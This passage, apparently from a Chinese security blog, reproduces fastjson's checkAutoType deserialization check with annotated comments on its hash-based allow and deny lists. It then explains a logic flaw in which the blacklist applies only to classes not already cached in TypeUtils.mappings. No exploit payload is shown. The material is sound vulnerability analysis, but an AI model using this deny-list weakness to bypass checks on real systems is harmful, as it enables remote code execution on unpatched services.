</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span style="color:#fff;font-weight:bold">int</span> features) {
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 类名非空判断
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (typeName == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 类名长度判断，不大于128不小于3
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (typeName.<span style="color:#007f7f">length</span>() &gt;= <span style="color:#ff0;font-weight:bold">128</span> || typeName.<span style="color:#007f7f">length</span>() &lt; <span style="color:#ff0;font-weight:bold">3</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        String className = typeName.<span style="color:#007f7f">replace</span>(<span style="color:#0ff;font-weight:bold">&#39;$&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>        Class&lt;?&gt; clazz = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">long</span> BASIC = <span style="color:#ff0;font-weight:bold">0xcbf29ce484222325L</span>; <span style="color:#007f7f">//;
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">long</span> PRIME = <span style="color:#ff0;font-weight:bold">0x100000001b3L</span>;  <span style="color:#007f7f">//L
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">long</span> h1 = (BASIC ^ className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">0</span>)) * PRIME;
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 类名以 [ 开头抛出异常
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (h1 == <span style="color:#ff0;font-weight:bold">0xaf64164c86024f1aL</span>) { <span style="color:#007f7f">// [
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 类名以 L 开头以 ; 结尾抛出异常
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> ((h1 ^ className.<span style="color:#007f7f">charAt</span>(className.<span style="color:#007f7f">length</span>() - <span style="color:#ff0;font-weight:bold">1</span>)) * PRIME == <span style="color:#ff0;font-weight:bold">0x9198507b5af98f0L</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">long</span> h3 = (((((BASIC ^ className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">0</span>))
</span></span><span style="display:flex;"><span>                * PRIME)
</span></span><span style="display:flex;"><span>                ^ className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">1</span>))
</span></span><span style="display:flex;"><span>                * PRIME)
</span></span><span style="display:flex;"><span>                ^ className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">2</span>))
</span></span><span style="display:flex;"><span>                * PRIME;
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (autoTypeSupport || expectClass != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">long</span> hash = h3;
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">3</span>; i &lt; className.<span style="color:#007f7f">length</span>(); ++i) {
</span></span><span style="display:flex;"><span>                hash ^= className.<span style="color:#007f7f">charAt</span>(i);
</span></span><span style="display:flex;"><span>                hash *= PRIME;
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (Arrays.<span style="color:#007f7f">binarySearch</span>(acceptHashCodes, hash) &gt;= <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>                    clazz = TypeUtils.<span style="color:#007f7f">loadClass</span>(typeName, defaultClassLoader, <span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">if</span> (clazz != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#007f7f">// 在对比 denyHashCodes 进行黑名单匹配
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                <span style="color:#007f7f">// 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                <span style="color:#007f7f">// 则抛出异常
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                <span style="color:#fff;font-weight:bold">if</span> (Arrays.<span style="color:#007f7f">binarySearch</span>(denyHashCodes, hash) &gt;= <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp; TypeUtils.<span style="color:#007f7f">getClassFromMapping</span>(typeName) == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 尝试在 TypeUtils.mappings 中查找缓存的 class
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (clazz == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            clazz = TypeUtils.<span style="color:#007f7f">getClassFromMapping</span>(typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 尝试在 deserializers 中查找这个类
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (clazz == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            clazz = deserializers.<span style="color:#007f7f">findClass</span>(typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 如果找到了对应的 class，则会进行 return
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (clazz != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (expectClass != <span style="color:#fff;font-weight:bold">null</span>
</span></span><span style="display:flex;"><span>                    &amp;&amp; clazz != java.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">HashMap</span>.<span style="color:#007f7f">class</span>
</span></span><span style="display:flex;"><span>                    &amp;&amp; !expectClass.<span style="color:#007f7f">isAssignableFrom</span>(clazz)) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;type not match. &#34;</span> + typeName + <span style="color:#0ff;font-weight:bold">&#34; -&gt; &#34;</span> + expectClass.<span style="color:#007f7f">getName</span>());
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (!autoTypeSupport) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">long</span> hash = h3;
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">3</span>; i &lt; className.<span style="color:#007f7f">length</span>(); ++i) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">char</span> c = className.<span style="color:#007f7f">charAt</span>(i);
</span></span><span style="display:flex;"><span>                hash ^= c;
</span></span><span style="display:flex;"><span>                hash *= PRIME;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (Arrays.<span style="color:#007f7f">binarySearch</span>(denyHashCodes, hash) &gt;= <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (Arrays.<span style="color:#007f7f">binarySearch</span>(acceptHashCodes, hash) &gt;= <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">if</span> (clazz == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                        clazz = TypeUtils.<span style="color:#007f7f">loadClass</span>(typeName, defaultClassLoader, <span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">if</span> (expectClass != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; expectClass.<span style="color:#007f7f">isAssignableFrom</span>(clazz)) {
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;type not match. &#34;</span> + typeName + <span style="color:#0ff;font-weight:bold">&#34; -&gt; &#34;</span> + expectClass.<span style="color:#007f7f">getName</span>());
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (clazz == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            clazz = TypeUtils.<span style="color:#007f7f">loadClass</span>(typeName, defaultClassLoader, <span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (clazz != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (TypeUtils.<span style="color:#007f7f">getAnnotation</span>(clazz,JSONType.<span style="color:#007f7f">class</span>) != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (ClassLoader.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">isAssignableFrom</span>(clazz) <span style="color:#007f7f">// classloader is danger
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                    || DataSource.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">isAssignableFrom</span>(clazz) <span style="color:#007f7f">// dataSource can load jdbc driver
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                    ) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (expectClass != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (expectClass.<span style="color:#007f7f">isAssignableFrom</span>(clazz)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>                } <span style="color:#fff;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;type not match. &#34;</span> + typeName + <span style="color:#0ff;font-weight:bold">&#34; -&gt; &#34;</span> + expectClass.<span style="color:#007f7f">getName</span>());
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            JavaBeanInfo beanInfo = JavaBeanInfo.<span style="color:#007f7f">build</span>(clazz, clazz, propertyNamingStrategy);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (beanInfo.<span style="color:#007f7f">creatorConstructor</span> != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; autoTypeSupport) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">int</span> mask = Feature.<span style="color:#007f7f">SupportAutoType</span>.<span style="color:#007f7f">mask</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">boolean</span> autoTypeSupport = <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">autoTypeSupport</span>
</span></span><span style="display:flex;"><span>                || (features &amp; mask) != <span style="color:#ff0;font-weight:bold">0</span>
</span></span><span style="display:flex;"><span>                || (JSON.<span style="color:#007f7f">DEFAULT_PARSER_FEATURE</span> &amp; mask) != <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (!autoTypeSupport) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>由以上代码可知，这里存在一个逻辑问题：autoTypeSupport 为 true 时，fastjson 会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。这里就留下了一个伏笔。就是这个逻辑导致了 1.2.32 之前的版本将会受到 autoTypeSupport 的影响。</p>
